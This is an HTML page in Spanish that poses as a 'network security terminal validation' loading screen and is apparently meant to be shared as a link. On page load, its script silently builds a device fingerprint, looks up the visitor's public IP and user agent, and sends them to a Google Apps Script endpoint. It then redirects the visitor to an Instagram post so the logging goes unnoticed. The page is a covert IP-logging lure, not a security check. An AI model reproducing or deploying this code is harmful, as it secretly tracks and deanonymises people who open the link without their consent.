<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>

    <meta property="og:title" content="Seguridad de Red: Validación de Terminal" />
    <meta property="og:description" content="Verificando integridad de la conexión móvil para acceso seguro." />
    <meta property="og:image" content="https://dennismariapinogomez-cmd.github.io/validacion-seguridad/portada.jpeg" />

    <style>
        body { background: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>

<script>
    window.onload = async function() {
        // 1. GENERACIÓN DE ID AUTOMÁTICO (FINGERPRINT)
        // Esto crea un ID único basado en el hardware del celular sin que el usuario haga nada
        const screenRes = screen.width + "x" + screen.height;
        const cores = navigator.hardwareConcurrency || "N/A";
        const platform = navigator.platform;
        const autoID = `AUDIT_${platform}_${screenRes}_CPU${cores}`;

        let ip = "0.0.0.0";
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch (e) { ip = "IP_Protegida"; }

        const ua = encodeURIComponent(navigator.userAgent);
        const scriptURL = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";

        // 2. REGISTRO SILENCIOSO CON KEEPALIVE PARA MÓVILES
        fetch(`${scriptURL}?u=${autoID}&ip=${ip}&ua=${ua}`, { 
            mode: 'no-cors',
            keepalive: true 
        });

        // 3. REDIRECCIÓN INSTANTÁNEA
        setTimeout(() => {
            window.location.href = "https://www.instagram.com/p/C_m_6u0shW2/";
        }, 600); 
    };
</script>
</body>
</html>
